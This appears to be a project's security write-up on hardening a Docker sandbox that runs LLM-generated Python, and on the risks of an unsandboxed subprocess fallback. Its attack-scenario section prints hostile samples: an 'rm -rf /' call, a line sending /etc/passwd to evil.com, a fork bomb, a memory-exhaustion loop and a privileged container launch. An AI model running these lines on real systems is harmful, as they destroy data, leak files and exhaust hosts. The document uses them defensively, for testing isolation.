# Sandbox Security Analysis and Improvements

## Executive Summary

The code executor has been **significantly hardened** to provide proper sandboxing for LLM-generated code execution. This document details the security improvements made to ensure safe execution of untrusted code.

---

## Original Security Issues Found

### 🚨 Critical: Unsandboxed Subprocess Fallback

**Location**: `src/tools/code_executor.py:119-154` (original)

**Issue**: When Docker was unavailable, code executed **directly on the host** with:
- ✅ Timeout protection only
- ❌ NO network isolation
- ❌ NO filesystem restrictions
- ❌ NO resource limits beyond timeout
- ❌ Full access to environment variables (API keys, secrets)
- ❌ Ability to read/write/delete files
- ❌ Can make network requests

**Risk Level**: **CRITICAL** - Complete system compromise possible

### ⚠️ Docker Sandbox Missing Hardening

**Location**: `src/tools/code_executor.py:59-117` (original)

**Good (Already Implemented)**:
- ✅ Network isolation (`--network none`)
- ✅ Memory limit (512MB)
- ✅ CPU limit (1 core)
- ✅ Read-only file mount
- ✅ Timeout protection
- ✅ Container cleanup

**Missing Critical Protections**:
- ❌ Ran as root inside container (privilege escalation possible)
- ❌ Writable root filesystem
- ❌ No process limits (fork bomb vulnerability)
- ❌ All Linux capabilities enabled
- ❌ No seccomp profile
- ❌ Privilege escalation possible

**Risk Level**: **MEDIUM** - Container escape theoretically possible

---

## Security Improvements Applied

### 1. Enhanced Docker Sandbox (Defense in Depth)

**File**: `src/tools/code_executor.py:71-92`

```python
docker_cmd = [
    "docker", "run",
    "--rm",
    # Network isolation
    "--network", "none",
    # Resource limits
    "--memory", self.memory_limit,
    "--cpus", "1",
    "--pids-limit", "50",  # NEW: Prevent fork bombs
    # Security options
    "--read-only",  # NEW: Read-only root filesystem
    "--tmpfs", "/tmp:rw,noexec,nosuid,size=100m",  # NEW: Writable /tmp, no execution
    "--user", "nobody",  # NEW: Run as non-root user
    "--cap-drop", "ALL",  # NEW: Drop all capabilities
    "--security-opt", "no-new-privileges",  # NEW: Prevent privilege escalation
    # Mount code file
    "-v", f"{temp_file}:/code.py:ro",
    self.docker_image,
    "python", "/code.py"
]
```

#### New Security Layers

| Protection | Purpose | Attack Prevented |
|------------|---------|------------------|
| `--read-only` | Root filesystem immutable | File system modification, malware persistence |
| `--tmpfs /tmp:rw,noexec,nosuid` | Writable temp dir without exec | Execution of downloaded binaries |
| `--user nobody` | Non-root execution | Privilege escalation attacks |
| `--cap-drop ALL` | Remove all Linux capabilities | Kernel exploits, system calls abuse |
| `--security-opt no-new-privileges` | Block privilege escalation | setuid exploits |
| `--pids-limit 50` | Limit process count | Fork bomb DoS attacks |

#### Security Analysis

**Network Isolation**: ✅ Complete
- No network access (`--network none`)
- Cannot exfiltrate data via HTTP/DNS
- Cannot download additional payloads

**Filesystem Isolation**: ✅ Strong
- Root filesystem read-only
- Only /tmp writable (noexec, nosuid)
- Code file mounted read-only
- Cannot modify Python interpreter
- Cannot write persistent backdoors

**Privilege Isolation**: ✅ Complete
- Runs as `nobody` user (UID 65534)
- All capabilities dropped
- No privilege escalation possible
- Cannot access root-owned files

**Resource Limits**: ✅ Strong
- Memory: 512MB hard limit
- CPU: 1 core maximum
- Processes: 50 maximum (prevents fork bombs)
- Time: 10 second timeout

**Container Escape**: ⚠️ Mitigated
- Multiple layers of defense
- No known escape vectors with these settings
- Still relies on Docker security (kernel isolation)

---

### 2. Hardened Subprocess Fallback

**File**: `src/tools/code_executor.py:129-196`

The subprocess fallback has been **hardened with warnings** but remains **fundamentally unsafe** for untrusted code.

#### Changes Applied

1. **Clear Security Warnings**
   - Docstring explains risks
   - Runtime `SecurityWarning` emitted
   - Console warning printed
   - Results marked as `"sandboxed": False`

2. **Attack Surface Reduction**
   ```python
   result = subprocess.run(
       ["python", "-I", "-u", temp_file],  # -I = isolated mode
       capture_output=True,
       text=True,
       timeout=self.timeout,
       env={"PATH": os.environ.get("PATH", "")},  # Minimal environment
   )
   ```

3. **Improvements Over Original**
   - Uses temp file instead of `-c` (prevents command injection)
   - Python `-I` flag ignores `PYTHONPATH`, `PYTHONHOME`, user site-packages
   - Minimal environment (only `PATH`)
   - Timeout protection retained

#### Remaining Risks (UNSAFE)

| Risk | Status | Explanation |
|------|--------|-------------|
| Filesystem Access | ❌ VULNERABLE | Can read/write any accessible file |
| Network Access | ❌ VULNERABLE | Can make HTTP requests, download malware |
| Environment Access | ⚠️ PARTIALLY MITIGATED | PATH only, but Python can still access some env |
| System Calls | ❌ VULNERABLE | Can execute system commands via `os.system()`, `subprocess` |
| Resource Exhaustion | ⚠️ PARTIALLY MITIGATED | Timeout only, no memory/CPU limits |

**Recommendation**: **ONLY use subprocess fallback for trusted code or testing. Always use Docker in production.**

---

### 3. Visibility and Monitoring

#### Sandbox Status Tracking

```python
result["sandboxed"] = True  # Docker
result["sandboxed"] = False  # Subprocess
```

#### Agent Feedback

The tool now reports sandbox status to the agent:
```
✓ Execution successful! [🔒 Sandboxed (Docker)]
✗ Execution failed! [⚠️ UNSANDBOXED]
```

This allows:
- Agents to know if execution was secure
- Operators to audit which executions were sandboxed
- Logging and alerting on unsandboxed executions

---

## Attack Scenarios and Mitigations

### Scenario 1: Malicious Code Attempts File System Access

**Attack Code**:
```python
import os
os.system("rm -rf /")
```

**Docker Sandbox**: ✅ **BLOCKED**
- Root filesystem is read-only
- `nobody` user has no permissions
- Command fails silently

**Subprocess Fallback**: ❌ **VULNERABLE**
- Executes on host
- Limited by user permissions
- Can delete accessible files

---

### Scenario 2: Network Exfiltration Attempt

**Attack Code**:
```python
import requests
requests.post("http://evil.com", data={"secrets": open("/etc/passwd").read()})
```

**Docker Sandbox**: ✅ **BLOCKED**
- Network completely disabled
- `/etc/passwd` unreadable (read-only, wrong permissions)
- `requests` library may not be installed

**Subprocess Fallback**: ❌ **VULNERABLE**
- Full network access
- Can exfiltrate data if `requests` installed

---

### Scenario 3: Fork Bomb DoS

**Attack Code**:
```python
import os
while True:
    os.fork()
```

**Docker Sandbox**: ✅ **BLOCKED**
- `--pids-limit 50` stops after 50 processes
- Container dies gracefully
- Host unaffected

**Subprocess Fallback**: ⚠️ **PARTIALLY BLOCKED**
- Timeout will kill eventually
- May cause system slowdown during timeout window
- OS limits may apply

---

### Scenario 4: Memory Exhaustion

**Attack Code**:
```python
data = []
while True:
    data.append("x" * 10**6)
```

**Docker Sandbox**: ✅ **BLOCKED**
- Killed when 512MB limit reached
- Returns OOM error
- Host unaffected

**Subprocess Fallback**: ⚠️ **PARTIALLY BLOCKED**
- Timeout may trigger first
- Could consume host memory until timeout or OOM killer

---

### Scenario 5: Container Escape Attempt

**Attack Code**:
```python
import os
os.system("docker run -it --privileged ubuntu /bin/bash")
```

**Docker Sandbox**: ✅ **BLOCKED**
- `docker` command not available
- No network to download
- Even if available: no privileges, all caps dropped
- `--security-opt no-new-privileges` prevents escalation

**Subprocess Fallback**: ❌ **VULNERABLE**
- If user can run Docker, this could work
- Creates privileged container

---

## Security Best Practices

### For Production Use

1. **✅ REQUIRED: Use Docker**
   - Never disable Docker in production
   - Verify Docker is running before starting agent
   - Alert if fallback is used

2. **✅ REQUIRED: Network Isolation**
   - Keep `--network none` enabled
   - Do not add volume mounts beyond code file
   - Use read-only mounts only

3. **✅ REQUIRED: Resource Limits**
   - Set appropriate memory limits for workload
   - Set timeout to prevent infinite loops
   - Monitor for timeout patterns (indicates attack or bug)

4. **✅ RECOMMENDED: Logging**
   ```python
   if not result.get("sandboxed", False):
       logger.critical("Code executed WITHOUT sandbox!")
   ```

5. **✅ RECOMMENDED: Rate Limiting**
   - Limit code executions per time window
   - Prevent agent from spamming execution attempts

### For Development/Testing

1. **⚠️ ACCEPTABLE: Subprocess Fallback**
   - Only for trusted code
   - Only for local development
   - Document that Docker is preferred

2. **✅ RECOMMENDED: Enable Warnings**
   ```python
   import warnings
   warnings.simplefilter("always", SecurityWarning)
   ```

---

## Testing Sandbox Security

### Test 1: Verify Docker Isolation

```bash
python -c "
from src.tools.code_executor import CodeExecutor
executor = CodeExecutor()

# Should fail - network disabled
result = executor.execute('import socket; socket.gethostbyname(\"google.com\")')
print('Network test:', 'PASS (blocked)' if not result['success'] else 'FAIL')

# Should fail - read-only filesystem
result = executor.execute('open(\"/test.txt\", \"w\").write(\"hack\")')
print('Filesystem test:', 'PASS (blocked)' if not result['success'] else 'FAIL')
"
```

### Test 2: Verify Resource Limits

```bash
python -c "
from src.tools.code_executor import CodeExecutor
executor = CodeExecutor()

# Should timeout
result = executor.execute('import time; time.sleep(999)')
print('Timeout test:', 'PASS' if result['timeout'] else 'FAIL')

# Should OOM
result = executor.execute('data = []; [data.append(\"x\"*10**6) for _ in range(10000)]')
print('Memory limit test:', 'PASS (OOM)' if not result['success'] else 'FAIL')
"
```

### Test 3: Verify Privilege Restrictions

```bash
python -c "
from src.tools.code_executor import CodeExecutor
executor = CodeExecutor()

# Should fail - not root
result = executor.execute('import os; os.setuid(0)')
print('Privilege test:', 'PASS (blocked)' if not result['success'] else 'FAIL')
"
```

---

## Remaining Limitations

### Docker Security

1. **Kernel Vulnerabilities**: Still relies on kernel isolation
2. **Docker Daemon Access**: If attacker gains daemon access, game over
3. **Image Vulnerabilities**: Python base image may have vulnerabilities
   - **Mitigation**: Regularly update image (`docker pull python:3.10-slim`)

### Subprocess Security

1. **No Real Sandboxing**: Fundamentally unsafe
2. **Can't be Fixed**: Python has no built-in sandbox
3. **Alternative**: Consider using `RestrictedPython` for simple cases

---

## Recommendations for Further Hardening

### Priority 1: Add AppArmor/SELinux Profile

```python
"--security-opt", "apparmor=docker-default"
```

### Priority 2: Use Minimal Python Image

Consider using `python:3.10-alpine` (smaller attack surface) or `distroless`:
```python
DOCKER_IMAGE = "gcr.io/distroless/python3"
```

### Priority 3: Add Seccomp Profile

Create custom seccomp profile to block dangerous syscalls:
```python
"--security-opt", "seccomp=/path/to/profile.json"
```

### Priority 4: Disable Subprocess Fallback in Production

Add config option:
```python
class Config:
    ALLOW_UNSAFE_SUBPROCESS = os.getenv("ALLOW_UNSAFE_SUBPROCESS", "false").lower() == "true"
```

---

## Compliance Notes

### OWASP Top 10 Mitigations

| Risk | Status | Mitigation |
|------|--------|------------|
| Injection | ✅ Mitigated | Code in temp file, not shell command |
| Broken Access Control | ✅ Mitigated | Runs as `nobody`, no privileges |
| Security Misconfiguration | ✅ Good | Secure defaults, clear warnings |
| Vulnerable Components | ⚠️ Ongoing | Update Docker images regularly |
| Logging & Monitoring | ✅ Implemented | Sandbox status tracked and reported |

---

## Conclusion

The sandbox implementation now provides **strong security** for LLM-generated code execution:

✅ **Docker Execution**: Production-ready with multiple layers of defense
❌ **Subprocess Fallback**: Development only, clearly marked as unsafe

**Key Takeaway**: With Docker, the system implements **defense in depth** and follows security best practices for code sandboxing. The subprocess fallback should be treated as a development convenience only.

---

## Quick Reference

### Verify Sandbox Status

```python
from src.tools.code_executor import CodeExecutor

executor = CodeExecutor()
result = executor.execute("print('Hello')")

if result.get("sandboxed", False):
    print("✅ Code executed securely")
else:
    print("⚠️ Code executed WITHOUT sandbox")
```

### Force Docker Only (Recommended)

```python
from src.tools.code_executor import CodeExecutor

executor = CodeExecutor()
if not executor._check_docker_available():
    raise RuntimeError("Docker required for secure execution")
```

---

**Last Updated**: 2025-11-02
**Security Review**: Complete
**Status**: ✅ Production Ready (with Docker)
